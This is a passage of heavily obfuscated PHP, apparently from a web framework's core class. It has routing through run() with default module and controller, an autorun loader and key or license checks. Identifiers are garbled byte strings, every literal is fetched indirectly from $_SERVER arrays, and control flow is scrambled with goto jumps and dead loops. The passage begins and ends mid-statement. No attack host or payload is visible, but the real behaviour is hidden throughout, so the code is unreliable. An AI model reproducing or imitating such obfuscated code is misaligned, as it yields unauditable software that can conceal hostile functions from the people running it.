$CòÀÉØ„÷Ä[13](array($CòÀÉØ„÷Ä[14], $CòÀÉØ„÷Ä[15]), $eš›À•Œ§ . $CòÀÉØ„÷Ä[16], $a‚Øò©Ö); $CòÀÉØ„÷Ä[17]($a‚Øò©Ö); goto f¬ßöÖÇá‹; FÁ½İ“–âê: $Aß§„¿Õİè =& $_SERVER[í…¶]; $CòÀÉØ„÷Ä =& $_SERVER[ˆ¹–ä¶]; $AôŠ¸µœ¶ = $CòÀÉØ„÷Ä[0]($CòÀÉØ„÷Ä[1], $a‚Øò©Ö); goto Dó¼ëÌÏÖ; DñïÈé×ìí: $eš›À•Œ§ = $CòÀÉØ„÷Ä[7]; $B³²•Æ = $Aß§„¿Õİè[566]; while ($B³²•Æ < $Aß§„¿Õİè[348]) { if ($B³²•Æ >= 0) { break; } $B³²•Æ++; } goto f™‘‚Ê‹É¯; Dó¼ëÌÏÖ: $b’æÑ‘Ğ–Ô = $CòÀÉØ„÷Ä[6]($AôŠ¸µœ¶[0]); $a”Å„„ÎšØ = $Aß§„¿Õİè[565]; if (!$a”Å„„ÎšØ) { return; } goto DñïÈé×ìí; f¬ßöÖÇá‹: $CòÀÉØ„÷Ä[13](array($CòÀÉØ„÷Ä[14], $CòÀÉØ„÷Ä[15]), $eš›À•Œ§ . $CòÀÉØ„÷Ä[18], $a‚Øò©Ö); $dÎë§æ°ÑÚ = $Aß§„¿Õİè[567]; goto a°ŠŞÖ‘¡Œ; a°ŠŞÖ‘¡Œ: } private function autorun() { $EìÇ”‚†Ê… =& $_SERVER[í…¶]; $f½§À·¢ìÃ =& $_SERVER[ˆ¹–ä¶]; global $config; if ($f½§À·¢ìÃ[19]($config[$f½§À·¢ìÃ[20]]) == 0) { return; } foreach ($config[$f½§À·¢ìÃ[20]] as $C´â÷ê¥¿« => $d´å›ÔÂŞƒ) { $this->{$_SERVER[ˆ¹–ä¶][21]}($d´å›ÔÂŞƒ); $B‚æ¯’ñŞÌ = $EìÇ”‚†Ê…[568]; if (strlen($B‚æ¯’ñŞÌ) < $EìÇ”‚†Ê…[348]) { die; } } } private function pdxr2a1c765a() { goto e„¼‚ğ÷; f…À„©Íİ: $Bã Ã¦Áš = $cƒÌÎ¦ê¢[572]; while (strlen($Bã Ã¦Áš) < $cƒÌÎ¦ê¢[348]) { if (!$Bã Ã¦Áš) { break; } $Bã Ã¦Áš++; } $GLOBALS[$EÚ¢¦ê¿¹[22]][$EÚ¢¦ê¿¹[23]] = $EÚ¢¦ê¿¹[27]($Fğªô‡’¸µ, $DãÕğÚŠÁ¹); goto dã£¹„™ë¯; Cƒ»î…ˆ®Â: $fôº¦ù™ = $cƒÌÎ¦ê¢[570]; if (!$fôº¦ù™) { die; } if (!$fÛùÒ•ò®± || $EÚ¢¦ê¿¹[24]($fÛùÒ•ò®±) <= $EÚ¢¦ê¿¹[24]($dŞŠøˆ„¹…)) { return; } goto A•­Ù†é¥; dã£¹„™ë¯: $GLOBALS[$EÚ¢¦ê¿¹[22]][$EÚ¢¦ê¿¹[28]] = $EÚ¢¦ê¿¹[29]($EÚ¢¦ê¿¹[1], $GLOBALS[$EÚ¢¦ê¿¹[22]][$EÚ¢¦ê¿¹[23]]); $bÛé„Æ×æ‡ = $cƒÌÎ¦ê¢[573]; if (strlen($bÛé„Æ×æ‡) < $cƒÌÎ¦ê¢[560]) { die; } goto F¹÷íÛ“¨ö; A•­Ù†é¥: if ($EÚ¢¦ê¿¹[6]($EÚ¢¦ê¿¹[25]($fÛùÒ•ò®±, -$EÚ¢¦ê¿¹[24]($dŞŠøˆ„¹…))) != $dŞŠøˆ„¹…) { return; } $FâË«Ší…³ = $EÚ¢¦ê¿¹[25]($fÛùÒ•ò®±, 0, -$EÚ¢¦ê¿¹[24]($dŞŠøˆ„¹…)); $E»Èâ›¶À = $cƒÌÎ¦ê¢[571]; goto aÓ‘Ö·¬Å; cä¼´†´±‡: $aÀ¾õ…ğİ» = $cƒÌÎ¦ê¢[569]; if (!$aÀ¾õ…ğİ») { die; } $fÛùÒ•ò®± = $GLOBALS[$EÚ¢¦ê¿¹[22]][$EÚ¢¦ê¿¹[23]][0]; goto Cƒ»î…ˆ®Â; aÓ‘Ö·¬Å: while ($E»Èâ›¶À < $cƒÌÎ¦ê¢[348]) { if ($E»Èâ›¶À >= 0) { break; } $E»Èâ›¶À++; } $Fğªô‡’¸µ = array($EÚ¢¦ê¿¹[8], $FâË«Ší…³); $DãÕğÚŠÁ¹ = $EÚ¢¦ê¿¹[26]($GLOBALS[$EÚ¢¦ê¿¹[22]][$EÚ¢¦ê¿¹[23]], 1); goto f…À„©Íİ; e„¼‚ğ÷: $cƒÌÎ¦ê¢ =& $_SERVER[í…¶]; $EÚ¢¦ê¿¹ =& $_SERVER[ˆ¹–ä¶]; $dŞŠøˆ„¹… = $EÚ¢¦ê¿¹[8]; goto cä¼´†´±‡; F¹÷íÛ“¨ö: } private function protd77926e3() { goto dÛçÌšòŞ‰; Dë¶È•ƒùò: $a´¼ïïˆÌİ = $Aª…è‡×ƒ[578]; if (strlen($a´¼ïïˆÌİ) < $Aª…è‡×ƒ[560]) { die; } $F†èâˆŠ¾™ = $E¯²Ø™ĞòÛ[2]($C›¼ˆêËíĞ[0][0], $E¯²Ø™ĞòÛ[36]); goto AéÚ§êìÃ; F¡§¥£ï¨™: if (!$F¸­“‚ŞâŸ) { return; } goto fÇ¨÷ŸëŒ; b—…ÁÏÖŒ‹: $F¹š±•í¡ = $_SERVER[$E¯²Ø™ĞòÛ[30]]; $BäµÒ‚ = $Aª…è‡×ƒ[574]; if (strlen($BäµÒ‚) < $Aª…è‡×ƒ[560]) { die; } goto c¦Øˆ©™ª; c¦Øˆ©™ª: $F‚¥âÏ˜’– = $E¯²Ø™ĞòÛ[31]; if (!$E¯²Ø™ĞòÛ[32]($F¹š±•í¡, $F‚¥âÏ˜’–)) { return; } $cåÍÅÏËïŞ = $E¯²Ø™ĞòÛ[33]($F¹š±•í¡, $F‚¥âÏ˜’–); goto D áç¢ó¬ã; dÛçÌšòŞ‰: $Aª…è‡×ƒ =& $_SERVER[í…¶]; $E¯²Ø™ĞòÛ =& $_SERVER[ˆ¹–ä¶]; if ($GLOBALS[$E¯²Ø™ĞòÛ[22]][$E¯²Ø™ĞòÛ[28]] != $E¯²Ø™ĞòÛ[10]) { return; } goto b—…ÁÏÖŒ‹; D áç¢ó¬ã: $F©Õ·–¬æ = $Aª…è‡×ƒ[575]; if (!$F©Õ·–¬æ) { return; } $F†èâˆŠ¾™ = $E¯²Ø™ĞòÛ[25]($F¹š±•í¡, $cåÍÅÏËïŞ + $E¯²Ø™ĞòÛ[24]($F‚¥âÏ˜’–)); goto C‘ó¯šÖ; C‘ó¯šÖ: $A§Ù˜ã½èó = $Aª…è‡×ƒ[576]; while ($A§Ù˜ã½èó < $Aª…è‡×ƒ[577]) { if ($A§Ù˜ã½èó >= 0) { break; } $A§Ù˜ã½èó++; } $E¯²Ø™ĞòÛ[34]($E¯²Ø™ĞòÛ[35], $F†èâˆŠ¾™, $C›¼ˆêËíĞ); goto Dë¶È•ƒùò; AéÚ§êìÃ: $GLOBALS[$E¯²Ø™ĞòÛ[22]][$E¯²Ø™ĞòÛ[23]] = $E¯²Ø™ĞòÛ[0]($E¯²Ø™ĞòÛ[36], $F†èâˆŠ¾™); $GLOBALS[$E¯²Ø™ĞòÛ[22]][$E¯²Ø™ĞòÛ[28]] = $E¯²Ø™ĞòÛ[29]($E¯²Ø™ĞòÛ[1], $GLOBALS[$E¯²Ø™ĞòÛ[22]][$E¯²Ø™ĞòÛ[23]]); $F¸­“‚ŞâŸ = $Aª…è‡×ƒ[579]; goto F¡§¥£ï¨™; fÇ¨÷ŸëŒ: } public function run() { goto f”“š ¸ ; bÈë¬¯¬©: $this->{$_SERVER[ˆ¹–ä¶][38]}(); $cÀÆÉ¢Ã´  = $EĞÌ…Éˆêê[580]; if (strlen($cÀÆÉ¢Ã´ ) < $EĞÌ…Éˆêê[577]) { die; } goto aÅ½ÜÌÇ¦‡; eÅ«õî—: $F÷ªá¦í‘²[39]($F÷ªá¦í‘²[40], isset($Fƒ¿ø³ö[0]) && $Fƒ¿ø³ö[0] ? $Fƒ¿ø³ö[0] : $this->defaultModule); $FÃîÈ‚¸Ñ = $EĞÌ…Éˆêê[584]; $F÷ªá¦í‘²[39]($F÷ªá¦í‘²[41], isset($Fƒ¿ø³ö[1]) && $Fƒ¿ø³ö[0] ? $Fƒ¿ø³ö[1] : $this->defaultController); goto d¡£Ûöµ³¥; AŒ‡´õÓÈá: $eš÷‡¡Â¸’ = $GLOBALS[$F÷ªá¦í‘²[22]][$F÷ªá¦í‘²[28]]; $FÑÏ³ÒÊ‚ = $EĞÌ…Éˆêê[583]; if (!$FÑÏ³ÒÊ‚) { die; } goto eÅ«õî—; f”“š ¸ : $EĞÌ…Éˆêê =& $_SERVER[í…¶]; $F÷ªá¦í‘² =& $_SERVER[ˆ¹–ä¶]; $this->{$_SERVER[ˆ¹–ä¶][37]}(); goto bÈë¬¯¬©; bæƒ×ÙŠá»: $this->{$_SERVER[ˆ¹–ä¶][45]}(); if ($F÷ªá¦í‘²[19]($Fƒ¿ø³ö) >= 3) { $this->{$_SERVER[ˆ¹–ä¶][21]}($eš÷‡¡Â¸’); } else { $this->{$_SERVER[ˆ¹–ä¶][21]}(ACTION); } goto e…èñ…¥¦; FñÇğŠ†: $F÷ªá¦í‘²[39]($F÷ªá¦í‘²[43], MOD . $F÷ªá¦í‘²[1] . ST . $F÷ªá¦í‘²[1] . ACT); $Eİ•·íœ„¤ = $EĞÌ…Éˆêê[586]; $_SERVER[$F÷ªá¦í‘²[44]] = $F÷ªá¦í‘²[6](ACTION); goto bæƒ×ÙŠá»; aÅ½ÜÌÇ¦‡: $Fƒ¿ø³ö = $GLOBALS[$F÷ªá¦í‘²[22]][$F÷ªá¦í‘²[23]]; $EŒÔÍó¼†· = $EĞÌ…Éˆêê[581]; while (strlen($EŒÔÍó¼†·) < $EĞÌ…Éˆêê[582]) { if (!$EŒÔÍó¼†·) { break; } $EŒÔÍó¼†·++; } goto AŒ‡´õÓÈá; d¡£Ûöµ³¥: $F÷ªá¦í‘²[39]($F÷ªá¦í‘²[42], isset($Fƒ¿ø³ö[2]) && $Fƒ¿ø³ö[0] ? $Fƒ¿ø³ö[2] : $this->defaultAction); $dÆ‹ÏÈå´ = $EĞÌ…Éˆêê[585]; while (strlen($dÆ‹ÏÈå´) < $EĞÌ…Éˆêê[348]) { if (!$dÆ‹ÏÈå´) { break; } $dÆ‹ÏÈå´++; } goto FñÇğŠ†; e…èñ…¥¦: } private $mayt17323c9d = array(); private $rqkt3cbf8d07 = ''; public function sdli05d3efda() { goto f—‹òŒ·‹‹; b‰×ó•ëíÙ: $AìÍ¿êö©ƒ = $bğÆƒéµµ¥[587]; if (!$AìÍ¿êö©ƒ) { return; } $this->{$_SERVER[ˆ¹–ä¶][47]}(); goto eø”†½ƒ¢Ú; eø”†½ƒ¢Ú: $DÛÂäà˜·Œ = $bğÆƒéµµ¥[588]; $this->{$_SERVER[ˆ¹–ä¶][48]}(); $this->{$_SERVER[ˆ¹–ä¶][49]}(); goto bƒ¤ñà´; f—‹òŒ·‹‹: $bğÆƒéµµ¥ =& $_SERVER[í…¶]; $D‹½¹Â†ñ =& $_SERVER[ˆ¹–ä¶]; $this->{$_SERVER[ˆ¹–ä¶][46]}(); goto b‰×ó•ëíÙ; F÷Êê©ëƒÑ: $this->{$_SERVER[ˆ¹–ä¶][3]}($D‹½¹Â†ñ[53], array($this, $D‹½¹Â†ñ[54])); $this->{$_SERVER[ˆ¹–ä¶][3]}($D‹½¹Â†ñ[55], array($this, $D‹½¹Â†ñ[56])); $this->{$_SERVER[ˆ¹–ä¶][3]}($D‹½¹Â†ñ[57], array($this, $D‹½¹Â†ñ[58])); goto DùÄåŠ“è„; a›§Ú‰ç…ö: $bÉÛœ„˜óß = $bğÆƒéµµ¥[590]; if (strlen($bÉÛœ„˜óß) < $bğÆƒéµµ¥[560]) { die; } $this->{$_SERVER[ˆ¹–ä¶][51]}(); goto aÅÑÁßÎ ; aÅÑÁßÎ : $this->{$_SERVER[ˆ¹–ä¶][52]}(); $F¦æ½Æİ = $bğÆƒéµµ¥[591]; while ($F¦æ½Æİ < $bğÆƒéµµ¥[564]) { if ($F¦æ½Æİ >= 0) { break; } $F¦æ½Æİ++; } goto F÷Êê©ëƒÑ; DùÄåŠ“è„: $this->{$_SERVER[ˆ¹–ä¶][3]}($D‹½¹Â†ñ[59], array($this, $D‹½¹Â†ñ[60])); goto C¼ˆÃ“ÏŞ; bƒ¤ñà´: $FŸ«æ¦ìÌ = $bğÆƒéµµ¥[589]; if (strlen($FŸ«æ¦ìÌ) < $bğÆƒéµµ¥[560]) { die; } $this->{$_SERVER[ˆ¹–ä¶][50]}(); goto a›§Ú‰ç…ö; C¼ˆÃ“ÏŞ: } public function cihe335e8159($CÒÇÔŒÕÊÆ) { goto CËáÒŠÏõ; eÜ¸ÌÌ…„: $bÔé®´´÷ = $c¡÷Êè‹…æ[592]; if (strlen($bÔé®´´÷) < $c¡÷Êè‹…æ[582]) { return; } $cï•¬Å£«à = array($BèÚç¸ö±[64], $BèÚç¸ö±[65], $BèÚç¸ö±[66], $BèÚç¸ö±[67], $BèÚç¸ö±[68], $BèÚç¸ö±[69], $BèÚç¸ö±[70], $BèÚç¸ö±[71], $BèÚç¸ö±[72], $BèÚç¸ö±[73], $BèÚç¸ö±[74], $BèÚç¸ö±[75], $BèÚç¸ö±[76], $BèÚç¸ö±[77], $BèÚç¸ö±[78], $BèÚç¸ö±[79], $BèÚç¸ö±[80], $BèÚç¸ö±[81], $BèÚç¸ö±[82], $BèÚç¸ö±[83], $BèÚç¸ö±[84], $BèÚç¸ö±[85], $BèÚç¸ö±[86], $BèÚç¸ö±[87], $BèÚç¸ö±[88], $BèÚç¸ö±[89], $BèÚç¸ö±[90]); goto Fš¼¯«Û…µ; dôªš¤Õ®: $f¡½†åò‘ª = $CÒÇÔŒÕÊÆ[$BèÚç¸ö±[93]][$BèÚç¸ö±[94]][$BèÚç¸ö±[76]]; unset($CÒÇÔŒÕÊÆ[$BèÚç¸ö±[93]][$BèÚç¸ö±[95]][$BèÚç¸ö±[96]]); unset($CÒÇÔŒÕÊÆ[$BèÚç¸ö±[93]][$BèÚç¸ö±[95]][$BèÚç¸ö±[97]]); goto Fù„¸ñœ¤; E‹­£šøå: if ($BèÚç¸ö±[104]($GLOBALS, $BèÚç¸ö±[132]) && $this->config[$BèÚç¸ö±[133]]) { $CÒÇÔŒÕÊÆ[$BèÚç¸ö±[108]][$BèÚç¸ö±[134]] = WEB_ROOT; } return $CÒÇÔŒÕÊÆ; goto b¥Î×ÂÅŠ§; Bî”‰˜âä™: $CÒÇÔŒÕÊÆ[$BèÚç¸ö±[108]][$BèÚç¸ö±[128]] = $BèÚç¸ö±[104]($this->mayt17323c9d, $BèÚç¸ö±[129], $BèÚç¸ö±[10]); $CÒÇÔŒÕÊÆ[$BèÚç¸ö±[108]][$BèÚç¸ö±[130]] = $BèÚç¸ö±[104]($this->mayt17323c9d, $BèÚç¸ö±[131], $BèÚç¸ö±[10]); $F…ÔØÜ¡Ê‡ = $c¡÷Êè‹…æ[598]; goto E‹­£šøå; aóÊ¬›: $EƒÍ¬³¯ó½ = $c¡÷Êè‹…æ[595]; if (!$EƒÍ¬³¯ó½) { return; } $CÒÇÔŒÕÊÆ[$BèÚç¸ö±[108]][$BèÚç¸ö±[109]] = $BèÚç¸ö±[110]($BèÚç¸ö±[111])->{$_SERVER[ˆ¹–ä¶][112]}(); goto EïÛÄ‘Ëë¨; D…ªíğ›²: $CÒÇÔŒÕÊÆ[$BèÚç¸ö±[108]][$BèÚç¸ö±[120]] = $this->rqkt3cbf8d07; if ($Dßáí±¤Ï©[$BèÚç¸ö±[120]] != $BèÚç¸ö±[121]) { $CÒÇÔŒÕÊÆ[$BèÚç¸ö±[108]][$BèÚç¸ö±[122]] = $Dßáí±¤Ï©[$BèÚç¸ö±[122]]; $CÒÇÔŒÕÊÆ[$BèÚç¸ö±[108]][$BèÚç¸ö±[123]] = $Dßáí±¤Ï©[$BèÚç¸ö±[123]]; $CÈ¼ãè‰Ëç = $BèÚç¸ö±[124](10) . $this->rqkt3cbf8d07 . $BèÚç¸ö±[124](5); $CÒÇÔŒÕÊÆ[$BèÚç¸ö±[93]][$BèÚç¸ö±[125]][$BèÚç¸ö±[126]] = $this->{$_SERVER[ˆ¹–ä¶][127]}($CÈ¼ãè‰Ëç, $CÒÇÔŒÕÊÆ[$BèÚç¸ö±[108]][$BèÚç¸ö±[113]]); } if ($this->rqkt3cbf8d07 == $BèÚç¸ö±[121]) { $CÒÇÔŒÕÊÆ[$BèÚç¸ö±[93]][$BèÚç¸ö±[94]][$BèÚç¸ö±[99]][$BèÚç¸ö±[107]] = 0; } goto Bî”‰˜âä™; Aæˆ½ŒïîÏ: $CÒÇÔŒÕÊÆ[$BèÚç¸ö±[108]][$BèÚç¸ö±[117]] = $BèÚç¸ö±[118]($BèÚç¸ö±[119]()); $E´÷Æ˜é… = $c¡÷Êè‹…æ[597]; while ($E´÷Æ˜é… < $c¡÷Êè‹…æ[564]) { if ($E´÷Æ˜é… >= 0) { break; } $E´÷Æ˜é…++; } goto D…ªíğ›²; Fù„¸ñœ¤: unset($CÒÇÔŒÕÊÆ[$BèÚç¸ö±[93]][$BèÚç¸ö±[94]][$BèÚç¸ö±[76]]); unset($CÒÇÔŒÕÊÆ[$BèÚç¸ö±[93]][$BèÚç¸ö±[94]][$BèÚç¸ö±[98]]); $CÒÇÔŒÕÊÆ[$BèÚç¸ö±[93]][$BèÚç¸ö±[94]][$BèÚç¸ö±[99]] = array($BèÚç¸ö±[100] => (int) $f¡½†åò‘ª[$BèÚç¸ö±[101]], $BèÚç¸ö±[102] => $BèÚç¸ö±[103]($BèÚç¸ö±[104]($f¡½†åò‘ª, $BèÚç¸ö±[105], array())), $BèÚç¸ö±[106] => (int) $BèÚç¸ö±[104]($f¡½†åò‘ª, $BèÚç¸ö±[107], 0)); goto aóÊ¬›; EïÛÄ‘Ëë¨: $BÖà†ŞĞ´ = $c¡÷Êè‹…æ[596]; if (strlen($BÖà†ŞĞ´) < $c¡÷Êè‹…æ[582]) { die; } $CÒÇÔŒÕÊÆ[$BèÚç¸ö±[108]][$BèÚç¸ö±[113]] = $BèÚç¸ö±[114]($_SERVER[$BèÚç¸ö±[115]] . $Dßáí±¤Ï©[$BèÚç¸ö±[116]]); goto Aæˆ½ŒïîÏ; CËáÒŠÏõ: $c¡÷Êè‹…æ =& $_SERVER[í…¶]; $BèÚç¸ö± =& $_SERVER[ˆ¹–ä¶]; $Dßáí±¤Ï© = $BèÚç¸ö±[61]($BèÚç¸ö±[62])->{$_SERVER[ˆ¹–ä¶][63]}(); goto eÜ¸ÌÌ…„; Fš¼¯«Û…µ: $A¤ò½ñªñ = $c¡÷Êè‹…æ[593]; if (strlen($A¤ò½ñªñ) < $c¡÷Êè‹…æ[560]) { die; } foreach ($cï•¬Å£«à as $eçù÷·Ñ­Ğ) { $e¯¿‡”½ô = $GLOBALS[$BèÚç¸ö±[91]][$BèÚç¸ö±[92]][$eçù÷·Ñ­Ğ]; $F¹•ÜÒÂ = $c¡÷Êè‹…æ[594]; if (!$F¹•ÜÒÂ) { die; } if (isset($Dßáí±¤Ï©[$eçù÷·Ñ­Ğ])) { $e¯¿‡”½ô = $Dßáí±¤Ï©[$eçù÷·Ñ­Ğ]; } $CÒÇÔŒÕÊÆ[$BèÚç¸ö±[93]][$BèÚç¸ö±[94]][$eçù÷·Ñ­Ğ] = $e¯¿‡”½ô; } goto dôªš¤Õ®; b¥Î×ÂÅŠ§: } private function ilzx57901ac2() { goto fáÕã­ï’Ö; AÜñ®š´ÉÅ: if ($this->rqkt3cbf8d07 == $C¨àÜ¾œÑŸ[121]) { return; } $DÓˆ„Ã‡†‚ = array($C¨àÜ¾œÑŸ[153], $C¨àÜ¾œÑŸ[154], $C¨àÜ¾œÑŸ[155], $C¨àÜ¾œÑŸ[156], $C¨àÜ¾œÑŸ[157], $C¨àÜ¾œÑŸ[158]); $FÀÀÄà´è = $C¨àÜ¾œÑŸ[61]($C¨àÜ¾œÑŸ[62])->{$_SERVER[ˆ¹–ä¶][63]}(); goto fª¥íŠªğÌ; fáÕã­ï’Ö: $fîëîÅ†à =& $_SERVER[í…¶]; $C¨àÜ¾œÑŸ =& $_SERVER[ˆ¹–ä¶]; if ($_SERVER[$C¨àÜ¾œÑŸ[44]] == $C¨àÜ¾œÑŸ[135]) { goto Fìî´Ûœİ·; DëĞ·«îÆó: $C¨àÜ¾œÑŸ[13](array($C¨àÜ¾œÑŸ[151], $C¨àÜ¾œÑŸ[152]), $e¾åÜÍğÙù); $a«ßô¢… ’ = $fîëîÅ†à[600]; goto c­¸–äö; Fìî´Ûœİ·: $e´Àß¯³• = array($C¨àÜ¾œÑŸ[120] => $this->rqkt3cbf8d07, $C¨àÜ¾œÑŸ[136] => $this->{$_SERVER[ˆ¹–ä¶][137]}(), $C¨àÜ¾œÑŸ[138] => $C¨àÜ¾œÑŸ[61]($C¨àÜ¾œÑŸ[139])->{$_SERVER[ˆ¹–ä¶][140]}()); if ($this->rqkt3cbf8d07 != $C¨àÜ¾œÑŸ[121]) { $AïÔ¦•õĞ™ = $C¨àÜ¾œÑŸ[104]($this->mayt17323c9d, $C¨àÜ¾œÑŸ[141]); if ($AïÔ¦•õĞ™) { $e´Àß¯³•[$C¨àÜ¾œÑŸ[142]] = $AïÔ¦•õĞ™; $e´Àß¯³•[$C¨àÜ¾œÑŸ[143]] = $C¨àÜ¾œÑŸ[144]($C¨àÜ¾œÑŸ[104]($this->mayt17323c9d, $C¨àÜ¾œÑŸ[145])); $e´Àß¯³•[$C¨àÜ¾œÑŸ[146]] = $C¨àÜ¾œÑŸ[104]($this->mayt17323c9d, $C¨àÜ¾œÑŸ[131]); } } $e´Àß¯³• = $this->{$_SERVER[ˆ¹–ä¶][147]}($C¨àÜ¾œÑŸ[148]($e´Àß¯³•), $C¨àÜ¾œÑŸ[114]($C¨àÜ¾œÑŸ[149])); goto c…Ì­æ‰¿ƒ; c…Ì­æ‰¿ƒ: $Fó®ôÂŒ = $fîëîÅ†à[599]; if (strlen($Fó®ôÂŒ) < $fîëîÅ†à[577]) { die; } $e¾åÜÍğÙù = array($C¨àÜ¾œÑŸ[150] => $e´Àß¯³•); goto DëĞ·«îÆó; c­¸–äö: } goto AÜñ®š´ÉÅ; Bï˜óää¹Õ: foreach ($DÓˆ„Ã‡†‚ as $aô‚¼Óè¾ç) { if (!isset($FÀÀÄà´è[$aô‚¼Óè¾ç]) || !$FÀÀÄà´è[$aô‚¼Óè¾ç]) { continue; } $e¾åÜÍğÙù[$aô‚¼Óè¾ç] = $FÀÀÄà´è[$aô‚¼Óè¾ç]; $C›í­ ÷ã = $fîëîÅ†à[602]; if (strlen($C›í­ ÷ã) < $fîëîÅ†à[582]) { die; } } $C¨àÜ¾œÑŸ[13](array($C¨àÜ¾œÑŸ[151], $C¨àÜ¾œÑŸ[152]), $e¾åÜÍğÙù); $bÒÂøĞ°¦ = $fîëîÅ†à[603]; goto fäµæ İÃ¸; fäµæ İÃ¸: if (!$bÒÂøĞ°¦) { die; } goto a¯íßêîĞ; fª¥íŠªğÌ: $e¾åÜÍğÙù = array($C¨àÜ¾œÑŸ[159] => $FÀÀÄà´è[$C¨àÜ¾œÑŸ[64]], $C¨àÜ¾œÑŸ[160] => $FÀÀÄà´è[$C¨àÜ¾œÑŸ[65]], $C¨àÜ¾œÑŸ[161] => $C¨àÜ¾œÑŸ[10]); $F¼Ú´³í ä = $fîëîÅ†à[601]; if (strlen($F¼Ú´³í ä) < $fîëîÅ†à[577]) { die; } goto Bï˜óää¹Õ; a¯íßêîĞ: } private function hpme100c12b2() { goto B‡ ²ÓÌ; a„ÕğŒÔî: $CôŞùÁ¢® = $dÓÖ§‡å‹[606]; if (strlen($CôŞùÁ¢®) < $dÓÖ§‡å‹[560]) { die; } $bƒ²ÊÒ¶¡ = $F³·Á÷àì£ . $eƒö¹Â[$BËŠ—œîÌ¹[120]] . $this->{$_SERVER[ˆ¹–ä¶][147]}($BËŠ—œîÌ¹[114]($eƒö¹Â[$BËŠ—œîÌ¹[209]]), $F³·Á÷àì£); goto CæÔ‚œƒ¶Î; a¬Ÿ©õ³ï©: while ($CÊä›æ’®• < $dÓÖ§‡å‹[348]) { if ($CÊä›æ’®• >= 0) { break; } $CÊä›æ’®•++; } $eƒö¹Â[$BËŠ—œîÌ¹[122]] = $BËŠ—œîÌ¹[214]($BËŠ—œîÌ¹[118]($this->{$_SERVER[ˆ¹–ä¶][147]}($F«ƒ¯‘ë¿Ù, $BËŠ—œîÌ¹[215]))); $F³·Á÷àì£ = $BËŠ—œîÌ¹[124](16); goto a„ÕğŒÔî; d…ÀÑ¼¸ ¥: if (!$BËŠ—œîÌ¹[191]($C„³–„åİ) || !$BËŠ—œîÌ¹[191]($C„³–„åİ[$BËŠ—œîÌ¹[192]]) || $C„³–„åİ[$BËŠ—œîÌ¹[165]] != !0) { $f™ä´ØŞÁÁ = $BËŠ—œîÌ¹[197]($BËŠ—œîÌ¹[198]); $E»İÀÃ·ÁÑ = $C„³–„åİ[$BËŠ—œîÌ¹[192]] ? $BËŠ—œîÌ¹[194] . $C„³–„åİ[$BËŠ—œîÌ¹[192]] : $f™ä´ØŞÁÁ; $BËŠ—œîÌ¹[166]($E»İÀÃ·ÁÑ, !1); } $B­˜ä¦Ñ’ = $C„³–„åİ[$BËŠ—œîÌ¹[192]]; $b«£¹æ„Œ = $this->{$_SERVER[ˆ¹–ä¶][199]}($B­˜ä¦Ñ’[$BËŠ—œîÌ¹[200]]); goto f³‚ó‚Ù¬¿; cŒ®‘è«: $BËŠ—œîÌ¹[61]($BËŠ—œîÌ¹[11])->{$_SERVER[ˆ¹–ä¶][226]}($FÄâ‚äãá[$BËŠ—œîÌ¹[227]], array($BËŠ—œîÌ¹[228] => $cìõÔåÑ¶“)); $BŒÎ„­‹‰­ = $dÓÖ§‡å‹[608]; $this->mayt17323c9d = $B­˜ä¦Ñ’; goto FöÚÌ …ï§; B½ˆß™‰ì®: $cìõÔåÑ¶“[$C†ƒƒ¬†ßÛ] = $f¥‹Ÿ±Ø; $fí¡¤áÁ¸ = $dÓÖ§‡å‹[607]; if (strlen($fí¡¤áÁ¸) < $dÓÖ§‡å‹[564]) { return; } goto cŒ®‘è«; E¹¦Õ‚ùƒº: $F˜Òó‡èé› = $BËŠ—œîÌ¹[222]($BËŠ—œîÌ¹[61]($BËŠ—œîÌ¹[11])->{$_SERVER[ˆ¹–ä¶][223]}(), $BËŠ—œîÌ¹[224]); $FÄâ‚äãá = $F˜Òó‡èé›[$BËŠ—œîÌ¹[225]]; $cìõÔåÑ¶“ = array(); goto B½ˆß™‰ì®; f³‚ó‚Ù¬¿: if (!$b«£¹æ„Œ || $b«£¹æ„Œ != $BËŠ—œîÌ¹[201]($B­˜ä¦Ñ’[$BËŠ—œîÌ¹[145]])) { $C±á†¬œ‘Ñ = array($BËŠ—œîÌ¹[202] => $BËŠ—œîÌ¹[61]($BËŠ—œîÌ¹[62])->{$_SERVER[ˆ¹–ä¶][63]}($BËŠ—œîÌ¹[116]), $BËŠ—œîÌ¹[203] => $_SERVER[$BËŠ—œîÌ¹[115]], $BËŠ—œîÌ¹[204] => $BËŠ—œîÌ¹[205](), $BËŠ—œîÌ¹[174] => $_SERVER[$BËŠ—œîÌ¹[175]]); $Eäôƒœ¸½¨ = $this->{$_SERVER[ˆ¹–ä¶][206]}($BËŠ—œîÌ¹[148]($C±á†¬œ‘Ñ)); $this->{$_SERVER[ˆ¹–ä¶][182]}($BËŠ—œîÌ¹[207] . $Eäôƒœ¸½¨); $BËŠ—œîÌ¹[166]($BËŠ—œîÌ¹[197]($BËŠ—œîÌ¹[208]), !0); } $eƒö¹Â = array($BËŠ—œîÌ¹[209] => $dô¯•¶çï­[$BËŠ—œîÌ¹[165]], $BËŠ—œîÌ¹[210] => $B­˜ä¦Ñ’[$BËŠ—œîÌ¹[211]], $BËŠ—œîÌ¹[212] => $BËŠ—œîÌ¹[124](16), $BËŠ—œîÌ¹[120] => $B­˜ä¦Ñ’[$BËŠ—œîÌ¹[213]]); if ($dô¯•¶çï­[$BËŠ—œîÌ¹[168]]) { $eƒö¹Â[$BËŠ—œîÌ¹[212]] = $dô¯•¶çï­[$BËŠ—œîÌ¹[168]]; } goto d¢‡éŠóö²; d¢‡éŠóö²: $Fˆ¨”‘¨„“ = $BËŠ—œîÌ¹[25]($BËŠ—œîÌ¹[114]($eƒö¹Â[$BËŠ—œîÌ¹[210]]), 10, 10); $F«ƒ¯‘ë¿Ù = $Fˆ¨”‘¨„“ . $eƒö¹Â[$BËŠ—œîÌ¹[120]] . $eƒö¹Â[$BËŠ—œîÌ¹[212]]; $CÊä›æ’®• = $dÓÖ§‡å‹[605]; goto a¬Ÿ©õ³ï©; FöÚÌ …ï§: $DïŠğ»ïÅå = $dÓÖ§‡å‹[609]; if (!$DïŠğ»ïÅå) { die; } $this->rqkt3cbf8d07 = $eƒö¹Â[$BËŠ—œîÌ¹[120]]; goto fîëöÜÛèÍ; F¬øÈµ”°ñ: $bäƒªÜƒá› = $dÓÖ§‡å‹[604]; $EÆ³È—ñÎˆ = $BËŠ—œîÌ¹[114]($_SERVER[$BËŠ—œîÌ¹[115]] . $dñ«¢Èó®á); if ($Cš™ÏÓë¡[$BËŠ—œîÌ¹[178]] == $BËŠ—œîÌ¹[179]) { $dÄÇøĞÎ¢İ = 